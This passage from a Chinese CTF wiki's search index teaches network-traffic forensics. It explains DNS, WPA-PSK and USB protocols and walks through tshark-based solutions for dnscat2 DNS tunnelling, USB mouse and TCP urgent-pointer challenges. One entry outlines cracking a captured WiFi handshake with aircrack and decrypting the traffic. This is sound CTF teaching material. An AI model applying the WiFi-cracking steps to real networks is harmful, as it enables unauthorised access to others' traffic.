2015 14:15:54 GMT\nETag:  1c-524f98378d4e1 \nAccept-Ranges: bytes\nContent-Length: 28\nContent-Type: text/html\n\nThe key is 39u7v25n1jxkl123", 
            "title": "HTTPS"
        }, 
        {
            "location": "/misc/traffic/protocols/#ftp", 
            "text": "", 
            "title": "FTP"
        }, 
        {
            "location": "/misc/traffic/protocols/#dns", 
            "text": "DNS\u901a\u5e38\u4e3aUDP\u534f\u8bae,\u62a5\u6587\u683c\u5f0f  +-------------------------------+ |  \u62a5\u6587\u5934                          | \n+-------------------------------+ |  \u95ee\u9898  ( \u5411\u670d\u52a1\u5668\u63d0\u51fa\u7684\u67e5\u8be2\u90e8\u5206 )      | \n+-------------------------------+ |  \u56de\u7b54  ( \u670d\u52a1\u5668\u56de\u590d\u7684\u8d44\u6e90\u8bb0\u5f55 )        | \n+-------------------------------+ |  \u6388\u6743  ( \u6743\u5a01\u7684\u8d44\u6e90\u8bb0\u5f55 )             | \n+-------------------------------+ |  \u683c\u5916\u7684  ( \u683c\u5916\u7684\u8d44\u6e90\u8bb0\u5f55 )           | \n+-------------------------------+  \u67e5\u8be2\u5305\u53ea\u6709\u5934\u90e8\u548c\u95ee\u9898\u4e24\u4e2a\u90e8\u5206\uff0cDNS\u6536\u5230\u67e5\u8be2\u5305\u540e\uff0c\u6839\u636e\u67e5\u8be2\u5230\u7684\u4fe1\u606f\u8ffd\u52a0\u56de\u7b54\u4fe1\u606f\u3001\u6388\u6743\u673a\u6784\u3001\u989d\u5916\u8d44\u6e90\u8bb0\u5f55\uff0c\u5e76\u4e14\u4fee\u6539\u4e86\u5305\u5934\u7684\u76f8\u5173\u6807\u8bc6\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002  \u6bcf\u4e2aquestion\u90e8\u5206     0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                                               |\n /                     QNAME                     /\n /                                               /\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                     QTYPE                     |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                     QCLASS                    |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n ```\n\n- QNAME\uff1a\u4e3a\u67e5\u8be2\u7684\u57df\u540d\uff0c\u662f\u53ef\u53d8\u957f\u7684\uff0c\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u5c06\u57df\u540d\u7528.\u53f7\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u6bcf\u4e2a\u90e8\u5206\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8be5\u90e8\u5206\u7684\u957f\u5ea6\uff0c\u6700\u540e\u52a0\u4e00\u4e2a0\u5b57\u8282\u8868\u793a\u7ed3\u675f\n- QTYPE\uff1a\u536016\u4f4d\uff0c\u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u5171\u670916\u79cd\uff0c\u5e38\u7528\u503c\u6709\uff1a1\uff08A\u8bb0\u5f55\uff0c\u8bf7\u6c42\u4e3b\u673aIP\u5730\u5740\uff09\u30012\uff08NS\uff0c\u8bf7\u6c42\u6388\u6743DNS\u670d\u52a1\u5668\uff09\u30015\uff08CNAME\u522b\u540d\u67e5\u8be2\uff09\n\n\n\n**\u4f8b\u9898**\n\n- [BSides San Francisco CTF 2017 : dnscap-500](https://github.com/ctfs/write-ups-2017/tree/master/bsidessf-ctf-2017/forensics/dnscap-500)\n\n- Step:\n\n    - wireshark \u6253\u5f00\u53d1\u73b0\u5168\u90e8\u4e3aDNS\u534f\u8bae,\u67e5\u8be2\u540d\u4e3a\u5927\u91cf\u5b57\u7b26\u4e32`([\\w\\.]+)\\.skullseclabs\\.org`\n\n    - `tshark -r dnscap.pcap -T fields -e dns.qry.name   hex`\u63d0\u53d6\u540e\uff0cpython\u8f6c\u7801\n\n```python\nimport re\n\n\nfind =  \n\nwith open( hex , rb ) as f:\n    for i in f:\n        text = re.findall(r ([\\w\\.]+)\\.skull ,i)\n        if text:\n            find += text[0].replace( . , )\nprint find   \u53d1\u73b0\u51e0\u6761\u5173\u952e\u4fe1\u606f   Welcome to dnscap! The flag is below, have fun!!\nWelcome to dnscap! The flag is below, have fun!!\n!command (sirvimes)\n...\nIHDR\ngAMA\nbKGD\n        pHYs\nIHDR\ngAMA\nbKGD\n        pHYs\ntIME\nIDATx\n...\n2017-02-01T21:04:00-08:00\nIEND\nconsole (sirvimes)\nconsole (sirvimes)\nGood luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously,\nGood luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, d[\ngood luck. :)+ \nflag\u786e\u5b9e\u5305\u542b\u5728\u5176\u4e2d,\u4f46\u662f\u6709\u5927\u91cf\u91cd\u590d\u4fe1\u606f,\u4e00\u662f\u5e94\u4e3a question \u5728dns\u534f\u8bae\u4e2d\u67e5\u8be2\u548c\u53cd\u9988\u65f6\u90fd\u4f1a\u7528\u5230, -Y  ip.src == 192.168.43.91 \u8fdb\u884c\u8fc7\u6ee4\u540e\u53d1\u73b0\u8fd8\u662f\u6709\u4e0d\u5c11\u91cd\u590d\u90e8\u5206 %2A}\n%2A}\n%2A}q\n%2A}x\n%2A}\nIHDR\ngAMA\nbKGD\n        pHYs\ntIME\nIDATx\nHBBH\nCxRH!\nC1%t\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1   \u6839\u636e\u53d1\u73b0\u7684 dnscat \u627e\u5230  https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md  \u8fd9\u91cc\u4ecb\u7ecd\u4e86 dnscat \u534f\u8bae\u7684\u76f8\u5173\u4fe1\u606f,\u8fd9\u662f\u4e00\u79cd\u901a\u8fc7DNS\u4f20\u9012\u6570\u636e\u7684\u53d8\u79cd\u534f\u8bae,\u9898\u76ee\u6587\u4ef6\u4e2d\u5e94\u8be5\u672a\u4f7f\u7528\u52a0\u5bc6,\u6240\u4ee5\u76f4\u63a5\u770b\u8fd9\u91cc\u7684\u6570\u636e\u5757\u4fe1\u606f   MESSAGE_TYPE_MSG: [0x01]\n(uint16_t) packet_id\n(uint8_t) message_type [0x01]\n(uint16_t) session_id\n(uint16_t) seq\n(uint16_t) ack\n(byte[]) data   \u5728 qry.name \u4e2d\u53bb\u9664\u5176\u4f59\u5b57\u6bb5,\u53ea\u7559\u4e0b data \u5feb,\u4ece\u800c\u5408\u5e76\u6570\u636e,\u518d\u4ece16\u8fdb\u5236\u4e2d\u68c0\u7d22 89504e.....6082 \u63d0\u53d6 png ,\u5f97\u5230flag   import   re  find   =   []  with   open ( hex , rb )   as   f : \n     for   i   in   f : \n         text   =   re . findall ( r ([\\w\\.]+)\\.skull , i ) \n         if   text : \n             tmp   =    text [ 0 ] . replace ( . , ) \n             find . append ( tmp [ 18 :])  last   =   []  for   i   in   find : \n     if   i   not   in   last : \n         last . append ( i )  print    . join ( last )   flag   \u76f8\u5173\u9898\u76ee   IceCTF-2016:Search  EIS-2017:DNS 101   \u53c2\u8003   https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md  https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough", 
            "title": "DNS"
        }, 
        {
            "location": "/misc/traffic/protocols/#wifi", 
            "text": "802.11\u662f\u73b0\u4eca\u65e0\u7ebf\u5c40\u57df\u7f51\u901a\u7528\u7684\u6807\u51c6,\u5e38\u89c1\u8ba4\u8bc1\u65b9\u5f0f\n- \u4e0d\u542f\u7528\u5b89\u5168\u200d\u200d\n- WEP\u200d\u200d\n- WPA/WPA2-PSK\uff08\u9884\u5171\u4eab\u5bc6\u94a5\uff09\u200d\u200d\n- PA/WPA2 802.1X \uff08radius\u8ba4\u8bc1\uff09", 
            "title": "WIFI"
        }, 
        {
            "location": "/misc/traffic/protocols/#wpa-psk", 
            "text": "\u8ba4\u8bc1\u5927\u81f4\u8fc7\u7a0b\u5982\u4e0b\u56fe   \u5176\u4e2d\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b    4\u6b21\u63e1\u624b\u5f00\u59cb\u4e8e\u9a8c\u8bc1\u5668(AP)\uff0c\u5b83\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c(ANonce)\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005  \u8bf7\u6c42\u8005\u4e5f\u4ea7\u751f\u4e86\u5b83\u81ea\u5df1\u7684\u968f\u673aSNonce\uff0c\u7136\u540e\u7528\u8fd9\u4e24\u4e2aNonces\u4ee5\u53caPMK\u751f\u6210\u4e86PTK\u3002\u8bf7\u6c42\u8005\u56de\u590d\u6d88\u606f2\u7ed9\u9a8c\u8bc1\u5668,\u8fd8\u6709\u4e00\u4e2aMIC\uff08message integrity code\uff0c\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\u4f5c\u4e3aPMK\u7684\u9a8c\u8bc1  \u5b83\u5148\u8981\u9a8c\u8bc1\u8bf7\u6c42\u8005\u5728\u6d88\u606f2\u4e2d\u53d1\u6765\u7684MIC\u7b49\u4fe1\u606f\uff0c\u9a8c\u8bc1\u6210\u529f\u540e\uff0c\u5982\u679c\u9700\u8981\u5c31\u751f\u6210GTK\u3002\u7136\u540e\u53d1\u9001\u6d88\u606f3  \u8bf7\u6c42\u8005\u6536\u5230\u6d88\u606f3\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u5bc6\u94a5\uff0c\u53d1\u9001\u6d88\u606f4\uff0c\u4e00\u4e2a\u786e\u8ba4\u4fe1\u606f\u3002\u9a8c\u8bc1\u5668\u6536\u5230\u6d88\u606f4\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u76f8\u540c\u7684\u5bc6\u94a5   \u4f8b\u9898      \u5b9e\u9a8c\u5427:  http://ctf5.shiyanbar.com/misc/shipin.cap   \u4ece\u5927\u91cf\u7684 Deauth  \u653b\u51fb\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u662f\u4e00\u4e2a\u7834\u89e3wifi\u65f6\u7684\u6d41\u91cf\u653b\u51fb  \u540c\u65f6\u4e5f\u6210\u529f\u53d1\u73b0\u4e86\u63e1\u624b\u5305\u4fe1\u606f   \u63a5\u4e0b\u6765\u8dd1\u5bc6\u7801   linux: aircrack\u5957\u4ef6  windows: wifipr,\u901f\u5ea6\u6bd4esaw\u5feb,GTX850\u80fd\u5c06\u8fd110w\\s  :)   \u5f97\u5230\u5bc6\u7801 88888888 \u5728wireshark\u4e2d Edit -  Preferences -  Protocols -  IEEE802.11 -  Edit \u4ee5 key:SSID \u5f62\u5f0f\u586b\u5165\u5373\u53ef\u89e3\u5bc6wifi\u5305\u770b\u5230\u660e\u6587\u6d41\u91cf   KCARCK\u76f8\u5173:  https://www.krackattacks.com/   \u53c2\u8003   http://www.freebuf.com/articles/wireless/58342.html  http://blog.csdn.net/keekjkj/article/details/46753883", 
            "title": "WPA-PSK"
        }, 
        {
            "location": "/misc/traffic/protocols/#usb", 
            "text": "USB\u8be6\u8ff0 :  http://www.usb.org/developers/hidpage/Hut1_12v2.pdf   \u9f20\u6807\u534f\u8bae   \u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684   \u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002  \u5f97\u5230\u8fd9\u4e9b\u70b9\u7684\u4fe1\u606f\u540e,\u5373\u53ef\u6062\u590d\u51fa\u9f20\u6807\u79fb\u52a8\u8f68\u8ff9    Tools   UsbMiceDataHacker     \u952e\u76d8\u534f\u8bae    \u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282   \u6839\u636edata\u503c\u4e0e\u5177\u4f53\u952e\u4f4d\u7684\u5bf9\u5e94\u5173\u7cfb   \u53ef\u4ece\u6570\u636e\u5305\u6062\u590d\u51fa\u952e\u76d8\u7684\u6848\u4ef6\u4fe1\u606f   Tools  UsbKeyboardDataHacker     \u53c2\u8003 \n-  https://www.anquanke.com/post/id/85218", 
            "title": "USB"
        }, 
        {
            "location": "/misc/traffic/data/", 
            "text": "\u8fd9\u4e00\u5757\u662f\u6d41\u91cf\u5305\u4e2d\u53e6\u4e00\u4e2a\u91cd\u70b9,\u901a\u8fc7\u5bf9\u534f\u8bae\u5206\u6790,\u627e\u5230\u4e86\u9898\u76ee\u7684\u5173\u952e\u70b9,\u5982\u4f55\u63d0\u53d6\u6570\u636e\u6210\u4e86\u63a5\u4e0b\u6765\u7684\u5173\u952e\u95ee\u9898\n\n\nwireshark\n\n\nwireshark\u81ea\u52a8\u5206\u6790\n\n\nfile -\n export objects -\n http\n\n\n\u624b\u52a8\u6570\u636e\u63d0\u53d6\n\n\nfile-\nexport selected Packet Bytes\n\n\ntshark\n\n\ntshark\u4f5c\u4e3awireshark\u7684\u547d\u4ee4\u884c\u7248,\u9ad8\u6548\u5feb\u6377\u662f\u5b83\u7684\u4f18\u70b9,\u914d\u5408\u5176\u4f59\u547d\u4ee4\u884c\u5de5\u5177(awk,grep)\u7b49\u7075\u6d3b\u4f7f\u7528,\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d,\u63d0\u53d6\u6570\u636e\u4ece\u800c\u7701\u53bb\u4e86\u7e41\u6742\u7684\u811a\u672c\u7f16\u5199\n\n\n\u518d\u770b\nGoogle CTF 2016 Forensic-200\n\u8fd9\u4e00\u9898,\u53ef\u4ee5\u901a\u8fc7tshark\u8fc5\u901f\u5b8c\u6210\u89e3\u9898\n\n\nwhat@kali:/tmp$ tshark -r capture.pcapng -T fields -e usb.capdata \n data2.txt\nwhat@kali:/tmp$ # awk -F: \nfunction comp(v){if(v\n127)v-=256;return v}{x+=comp(strtonum(\n0x\n$2));y+=comp(strtonum(\n0x\n$3))}$1==\n01\n{print x,y}\n data.txt \n data3.txt\nwhat@kali:/tmp$ gnuplot\n\n plot \ndata3.txt\n\n\n\n\n\n\n\nStep 1 \u9f20\u6807\u534f\u8bae\u4e2d\u6570\u636e\u63d0\u53d6\n\n\nStep 2 \u901a\u8fc7awk\u8fdb\u884c\u4f4d\u7f6e\u5750\u6807\u8f6c\u6362\n\n\nStep 3 \u5f62\u6210\u56fe\u5f62\n\n\n\n\n\n\n\u5e38\u7528\u65b9\u6cd5\n\n\n\n\ntshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** \n data\n\n\n\n\nUsage:\n  -Y \ndisplay filter\n      packet displaY filter in Wireshark display filter\n                           syntax\n  -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|?\n                           format of text output (def: text)\n  -e \nfield\n               field to print if -Tfields selected (e.g. tcp.port,\n                           _ws.col.Info)\n\n\n\n\n\u901a\u8fc7\n-Y\n\u8fc7\u6ee4\u5668(\u4e0ewireshark\u4e00\u81f4),\u7136\u540e\u7528\n-T filds -e\n\u914d\u5408\u6307\u5b9a\u663e\u793a\u7684\u6570\u636e\u6bb5(\u6bd4\u5982usb.capdata)\n\n\n\n\ntips\n\n\n-e\n\u540e\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u53ef\u4ee5\u7531wireshark\u53f3\u51fb\u9700\u8981\u7684\u6570\u636e\u9009\u4e2d\u540e\u5f97\u5230\n\n\n\n\n\n\n\n\n\u4f8b\u9898\n\n\n\n\ngoogle-ctf-2016 : a-cute-stegosaurus-100\n\n\n\n\n\u8fd9\u9898\u7684\u6570\u636e\u9690\u85cf\u7684\u975e\u5e38\u5de7\u5999,\u800c\u4e14\u6709\u4e00\u5f20\u56fe\u7247\u6df7\u6dc6\u89c6\u542c,\u9700\u8981\u5bf9\ntcp\n\u534f\u8bae\u975e\u5e38\u719f\u6089,\u6240\u4ee5\u5f53\u65f6\u505a\u51fa\u6765\u7684\u4eba\u5e76\u4e0d\u591a,\u5168\u7403\u53ea\u670926\u652f\u961f\u4f0d\n\n\n\u5728\ntcp\n\u62a5\u6587\u6bb5\u4e2d\u67096Bit\u7684\u72b6\u6001\u63a7\u5236\u7801,\u5206\u522b\u5982\u4e0b\n\n\n\n\nURG\uff1a\u7d27\u6025\u6bd4\u7279\uff08urgent\uff09,\u5f53URG\uff1d1\u65f6\uff0c\u8868\u660e\u7d27\u6025\u6307\u9488\u5b57\u6bb5\u6709\u6548,\u4ee3\u8868\u8be5\u5c01\u5305\u4e3a\u7d27\u6025\u5c01\u5305\u3002\u5b83\u544a\u8bc9\u7cfb\u7edf\u6b64\u62a5\u6587\u6bb5\u4e2d\u6709\u7d27\u6025\u6570\u636e\uff0c\u5e94\u5c3d\u5feb\u4f20\u9001(\u76f8\u5f53\u4e8e\u9ad8\u4f18\u5148\u7ea7\u7684\u6570\u636e)\n\n\nACK\uff1a\u786e\u8ba4\u6bd4\u7279\uff08Acknowledge\uff09\u3002\u53ea\u6709\u5f53ACK\uff1d1\u65f6\u786e\u8ba4\u53f7\u5b57\u6bb5\u624d\u6709\u6548,\u4ee3\u8868\u8fd9\u4e2a\u5c01\u5305\u4e3a\u786e\u8ba4\u5c01\u5305\u3002\u5f53ACK\uff1d0\u65f6\uff0c\u786e\u8ba4\u53f7\u65e0\u6548\u3002\n\n\nPSH\uff1a\uff08Push function\uff09\u82e5\u4e3a1\u65f6\uff0c\u4ee3\u8868\u8981\u6c42\u5bf9\u65b9\u7acb\u5373\u4f20\u9001\u7f13\u51b2\u533a\u5185\u7684\u5176\u4ed6\u5bf9\u5e94\u5c01\u5305\uff0c\u800c\u65e0\u9700\u7b49\u7f13\u51b2\u6ee1\u4e86\u624d\u9001\u3002\n\n\nRST\uff1a\u590d\u4f4d\u6bd4\u7279(Reset) ,\u5f53RST\uff1d1\u65f6\uff0c\u8868\u660eTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u4e25\u91cd\u5dee\u9519\uff08\u5982\u7531\u4e8e\u4e3b\u673a\u5d29\u6e83\u6216\u5176\u4ed6\u539f\u56e0\uff09\uff0c\u5fc5\u987b\u91ca\u653e\u8fde\u63a5\uff0c\u7136\u540e\u518d\u91cd\u65b0\u5efa\u7acb\u8fd0\u8f93\u8fde\u63a5\u3002\n\n\nSYN\uff1a\u540c\u6b65\u6bd4\u7279(Synchronous)\uff0cSYN\u7f6e\u4e3a1\uff0c\u5c31\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u6216\u8fde\u63a5\u63a5\u53d7\u62a5\u6587,\u901a\u5e38\u5e26\u6709 SYN \u6807\u5fd7\u7684\u5c01\u5305\u8868\u793a\u300e\u4e3b\u52a8\u300f\u8981\u8fde\u63a5\u5230\u5bf9\u65b9\u7684\u610f\u601d\u3002\u3002\n\n\nFIN\uff1a\u7ec8\u6b62\u6bd4\u7279(Final)\uff0c\u7528\u6765\u91ca\u653e\u4e00\u4e2a\u8fde\u63a5\u3002\u5f53FIN\uff1d1\u65f6\uff0c\u8868\u660e\u6b64\u62a5\u6587\u6bb5\u7684\u53d1\u9001\u7aef\u7684\u6570\u636e\u5df2\u53d1\u9001\u5b8c\u6bd5\uff0c\u5e76\u8981\u6c42\u91ca\u653e\u8fd0\u8f93\u8fde\u63a5\u3002\n\n\n\n\n\u800c\u8fd9\u91cc\u7684\ntcp.urg\n\u5374\u4e3a\n\n\n\n\n\u901a\u8fc7tshark\u63d0\u53d6\ntcp.urg\n\u7136\u540e\u53bb\u96640\u7684\u5b57\u6bb5,\u6362\u884c\u7b26\u8f6c\n,\n\u76f4\u63a5\u8f6c\u6362\u6210python\u7684\u5217\u8868,\u8f6cascii\u5373\u53ef\u5f97\u5230flag\n\n\n\u26a1 root@kali:  tshark -r Stego-200_urg.pcap -T fields -e  tcp.urgent_pointer|egrep -vi \n^0$\n|tr \n\\n\n \n,\n\nRunning as user \nroot\n and group \nroot\n. This could be dangerous.\n67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125,#\n...\n\n print \n.join([chr(x) for x in arr]) #python\u8f6c\u6362ascii\nCTF{And_You_Thought_It_Was_In_The_Picture}\n\n\n\n\n\u4f8b\u9898\n\n\n\n\n\n\nstego-150_ears.xz\n\n\n\n\n\n\nStep 1\n\n\n\n\n\n\n\u901a\u8fc7\nfile\n\u547d\u4ee4\u4e0d\u65ad\u89e3\u538b\u5f97\u5230pcap\u6587\u4ef6\n\n\n\u279c  Desktop file ears\nears: XZ compressed data\n\u279c  Desktop unxz \n ears \n file_1\n\u279c  Desktop file file_1\nfile_1: POSIX tar archive\n\u279c  Desktop 7z x file_1\n\n\n7\n-Zip \n[\n64\n]\n \n16\n.02 : Copyright \n(\nc\n)\n \n1999\n-2016 Igor Pavlov : \n2016\n-05-21\np7zip Version \n16\n.02 \n(\nlocale\n=\nen_US.UTF-8,Utf16\n=\non,HugeFiles\n=\non,64 bits,1 CPU Intel\n(\nR\n)\n Core\n(\nTM\n)\n i7-4710MQ CPU @ \n2\n.50GHz \n(\n306C3\n)\n,ASM,AES-NI\n)\n\n\n    Scanning the drive \nfor\n archives:\n    \n1\n file, \n4263936\n bytes \n(\n4164\n KiB\n)\n\n\n    Extracting archive: file_1\n    --\n    \nPath\n \n=\n file_1\n    \nType\n \n=\n tar\n    Physical \nSize\n \n=\n \n4263936\n\n    Headers \nSize\n \n=\n \n1536\n\n    Code \nPage\n \n=\n UTF-8\n\n    Everything is Ok\n\n    Size:       \n4262272\n\n    Compressed: \n4263936\n\n\n\n\n\n\n\nStep 2\n\n\n\n\n\u901a\u8fc7wireshark\u53d1\u73b0dns\u4e2d\u56de\u5e94\u540d\u5b57\u5b58\u5728\u5f02\u5e38\uff0c\u7ec4\u621016\u8fdb\u5236\u7684png\u6587\u4ef6\n\n\n\u91c7\u7528tshark\u8fdb\u884c\u63d0\u53d6,\u63d0\u53d6dns\u4e2d\u7684\u6570\u636e,\u7b5b\u9009\u5177\u4f53\u62a5\u6587\u5f62\u5f0f\n\\w{4,}.asis.io\n\n\ntshark -r forensic_175_d78a42edc01c9104653776f16813d9e5 -T fields -e dns.qry.name -e dns.flags|grep 8180|awk '{if ($1~/\\w{4,}.asis.io/) print $1}'|awk -F '.' '{print $1}'|tr -d '\\n' \n png\n\n\n\n\nStep 3\n\n\n\n\n16\u8fdb\u5236\u8fd8\u539f\u56fe\u7247\n\n\nxxd -p -r png flag\n\n\nPython Script\n\n\nTODO", 
            "title": "\u6570\u636e\u63d0\u53d6"
        }, 
        {
            "location": "/misc/traffic/data/#wireshark", 
            "text": "", 
            "title": "wireshark"
        }, 
        {
            "location": "/misc/traffic/data/#wireshark_1", 
            "text": "file -  export objects -  http", 
            "title": "wireshark\u81ea\u52a8\u5206\u6790"
        }, 
        {
            "location": "/misc/traffic/data/#_1", 
            "text": "file- export selected Packet Bytes", 
            "title": "\u624b\u52a8\u6570\u636e\u63d0\u53d6"
        }, 
        {
            "location": "/misc/traffic/data/#tshark", 
            "text": "tshark\u4f5c\u4e3awireshark\u7684\u547d\u4ee4\u884c\u7248,\u9ad8\u6548\u5feb\u6377\u662f\u5b83\u7684\u4f18\u70b9,\u914d\u5408\u5176\u4f59\u547d\u4ee4\u884c\u5de5\u5177(awk,grep)\u7b49\u7075\u6d3b\u4f7f\u7528,\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d,\u63d0\u53d6\u6570\u636e\u4ece\u800c\u7701\u53bb\u4e86\u7e41\u6742\u7684\u811a\u672c\u7f16\u5199  \u518d\u770b Google CTF 2016 Forensic-200 \u8fd9\u4e00\u9898,\u53ef\u4ee5\u901a\u8fc7tshark\u8fc5\u901f\u5b8c\u6210\u89e3\u9898  what@kali:/tmp$ tshark -r capture.pcapng -T fields -e usb.capdata   data2.txt\nwhat@kali:/tmp$ # awk -F:  function comp(v){if(v 127)v-=256;return v}{x+=comp(strtonum( 0x $2));y+=comp(strtonum( 0x $3))}$1== 01 {print x,y}  data.txt   data3.txt\nwhat@kali:/tmp$ gnuplot  plot  data3.txt    Step 1 \u9f20\u6807\u534f\u8bae\u4e2d\u6570\u636e\u63d0\u53d6  Step 2 \u901a\u8fc7awk\u8fdb\u884c\u4f4d\u7f6e\u5750\u6807\u8f6c\u6362  Step 3 \u5f62\u6210\u56fe\u5f62", 
            "title": "tshark"
        }, 
        {
            "location": "/misc/traffic/data/#_2", 
            "text": "tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | ****   data   Usage:\n  -Y  display filter       packet displaY filter in Wireshark display filter\n                           syntax\n  -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|?\n                           format of text output (def: text)\n  -e  field                field to print if -Tfields selected (e.g. tcp.port,\n                           _ws.col.Info)  \u901a\u8fc7 -Y \u8fc7\u6ee4\u5668(\u4e0ewireshark\u4e00\u81f4),\u7136\u540e\u7528 -T filds -e \u914d\u5408\u6307\u5b9a\u663e\u793a\u7684\u6570\u636e\u6bb5(\u6bd4\u5982usb.capdata)   tips  -e \u540e\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u53ef\u4ee5\u7531wireshark\u53f3\u51fb\u9700\u8981\u7684\u6570\u636e\u9009\u4e2d\u540e\u5f97\u5230     \u4f8b\u9898   google-ctf-2016 : a-cute-stegosaurus-100   \u8fd9\u9898\u7684\u6570\u636e\u9690\u85cf\u7684\u975e\u5e38\u5de7\u5999,\u800c\u4e14\u6709\u4e00\u5f20\u56fe\u7247\u6df7\u6dc6\u89c6\u542c,\u9700\u8981\u5bf9 tcp \u534f\u8bae\u975e\u5e38\u719f\u6089,\u6240\u4ee5\u5f53\u65f6\u505a\u51fa\u6765\u7684\u4eba\u5e76\u4e0d\u591a,\u5168\u7403\u53ea\u670926\u652f\u961f\u4f0d  \u5728 tcp \u62a5\u6587\u6bb5\u4e2d\u67096Bit\u7684\u72b6\u6001\u63a7\u5236\u7801,\u5206\u522b\u5982\u4e0b   URG\uff1a\u7d27\u6025\u6bd4\u7279\uff08urgent\uff09,\u5f53URG\uff1d1\u65f6\uff0c\u8868\u660e\u7d27\u6025\u6307\u9488\u5b57\u6bb5\u6709\u6548,\u4ee3\u8868\u8be5\u5c01\u5305\u4e3a\u7d27\u6025\u5c01\u5305\u3002\u5b83\u544a\u8bc9\u7cfb\u7edf\u6b64\u62a5\u6587\u6bb5\u4e2d\u6709\u7d27\u6025\u6570\u636e\uff0c\u5e94\u5c3d\u5feb\u4f20\u9001(\u76f8\u5f53\u4e8e\u9ad8\u4f18\u5148\u7ea7\u7684\u6570\u636e)  ACK\uff1a\u786e\u8ba4\u6bd4\u7279\uff08Acknowledge\uff09\u3002\u53ea\u6709\u5f53ACK\uff1d1\u65f6\u786e\u8ba4\u53f7\u5b57\u6bb5\u624d\u6709\u6548,\u4ee3\u8868\u8fd9\u4e2a\u5c01\u5305\u4e3a\u786e\u8ba4\u5c01\u5305\u3002\u5f53ACK\uff1d0\u65f6\uff0c\u786e\u8ba4\u53f7\u65e0\u6548\u3002  PSH\uff1a\uff08Push function\uff09\u82e5\u4e3a1\u65f6\uff0c\u4ee3\u8868\u8981\u6c42\u5bf9\u65b9\u7acb\u5373\u4f20\u9001\u7f13\u51b2\u533a\u5185\u7684\u5176\u4ed6\u5bf9\u5e94\u5c01\u5305\uff0c\u800c\u65e0\u9700\u7b49\u7f13\u51b2\u6ee1\u4e86\u624d\u9001\u3002  RST\uff1a\u590d\u4f4d\u6bd4\u7279(Reset) 